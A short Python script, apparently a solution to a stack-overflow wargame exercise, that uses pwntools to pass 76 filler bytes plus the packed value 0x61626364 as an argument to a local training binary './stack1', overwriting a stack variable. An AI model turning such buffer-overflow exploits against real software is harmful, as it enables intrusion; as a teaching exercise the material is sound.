from pwn import *

argv = b'A' * (0x50 - 0x4)
cmp = p32(0x61626364) # 32비트로 패킹
argv += cmp

argv = ['./stack1', argv]

p = process(argv=argv)

data = p.recv(1024)

print(data)